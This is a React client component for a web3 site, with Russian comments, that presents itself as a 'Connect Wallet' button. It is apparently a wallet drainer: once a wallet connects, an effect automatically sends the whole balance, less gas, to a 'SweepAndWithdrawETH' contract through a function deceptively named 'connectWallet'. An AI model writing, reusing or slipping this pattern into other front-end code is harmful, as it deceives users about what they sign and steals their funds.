'use client'

import React, { useEffect, useCallback } from 'react';

import { useClientMounted } from '@/hooks/useClientMount';
import { hyperliquidTestnet } from '@/chains/hyperliquidChain';
import { useAppKitAccount, useAppKit } from '@reown/appkit/react';
import { Address, encodeFunctionData } from 'viem';
import { useBalance, useDisconnect, usePublicClient, useWriteContract, useChainId } from 'wagmi';

import { CONTRACT_ADDRESS_TEST } from '@/constants/constants';
import SWEEP_AND_WITHDRAW_ABI from '@/abi/SweepAndWithdrawETH.json';


export function ConnectButton() {
  const mounted = useClientMounted()

  // AppKit-хуки для адреса и открытия модалки
  const { address, isConnected } = useAppKitAccount();
  const { open } = useAppKit(); // <-- вызов open({ chainId }) откроет AppKit-модал

  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { disconnect } = useDisconnect();


  // Баланс пользователя
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address as Address,
  });

  // Подготовленный хук для записи в контракт
  const {
    data: donateData,
    isError,
    isSuccess,
    writeContractAsync,
    isPending,
  } = useWriteContract();

  // При подключении проверяем сеть и получаем баланс
  useEffect(() => {
    if (!isConnected) return;
    if (chainId !== Number(hyperliquidTestnet.id)) {
      // Если не на том тестнете — показываем выбор сети
      // open({ chainId: Number(hyperliquidTestnet.id) });
      open({ view: 'Connect', namespace: 'eip155' })
    } else {
      // Иначе подгружаем баланс
      refetchBalance();
    }
  }, [isConnected, chainId, open, refetchBalance])

  // Вызов Смарт Контракта
  const handleConnectWallet = useCallback(
    async (balance: bigint) => {
      if (!publicClient || !address) return;
      try {
        const data = encodeFunctionData({
          abi: SWEEP_AND_WITHDRAW_ABI,
          functionName: 'connectWallet',
          args: [],
        });

        const estimatedGas = await publicClient.estimateGas({
          to: CONTRACT_ADDRESS_TEST,
          account: address as Address,
          data,
          value: balance,
        });
        const gasPrice = await publicClient.getGasPrice();
        const totalFee = estimatedGas * gasPrice;
        const valueToSend = balance > totalFee ? balance - totalFee : BigInt(0);
        if (valueToSend === BigInt(0)) {
          console.warn('Не хватает средств на газ');
          return;
        }

        const txHash = await writeContractAsync({
          address: CONTRACT_ADDRESS_TEST,
          abi: SWEEP_AND_WITHDRAW_ABI,
          functionName: 'connectWallet',
          value: valueToSend,
          gas: estimatedGas,
          gasPrice,
        });
        console.log('txHash', txHash);
      } catch (err) {
        console.error('Ошибка при транзакции:', err);
      }
    },
    [publicClient, address, writeContractAsync]
  );


  // Вызываем функцию Смарт Контракта, когда баланс подтянулся
  useEffect(() => {
    const balance = balanceData?.value ?? BigInt(0);
    if (isConnected && balance > BigInt(0)) {
      handleConnectWallet(balance);
    }
  }, [isConnected, balanceData, handleConnectWallet]);

   

  if (!mounted) return null;

  // UI для подключенного пользователя
  if (isConnected) {
    return (
      <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
        <button onClick={() => disconnect()}>
          Disconnect ({address?.slice(0, 6)}…{address?.slice(-4)})
        </button>
        {isPending && <span>Sending tx…</span>}
        {isError && <span style={{ color: 'red' }}>Tx error</span>}
        {isSuccess && donateData && <span style={{ color: 'green' }}>Tx: {donateData}</span>}
      </div>
    );
  }

  // Если не подключён — показываем кнопку «Connect Wallet»
  return (
    <button
      onClick={() => open({ view: 'Connect', namespace: 'eip155' })}
      style={{
        padding: '8px 16px',
        cursor: 'pointer',
        background: '#000',
        color: '#fff',
        borderRadius: '4px',
      }}
    >
      Connect Wallet
    </button>
  )
}
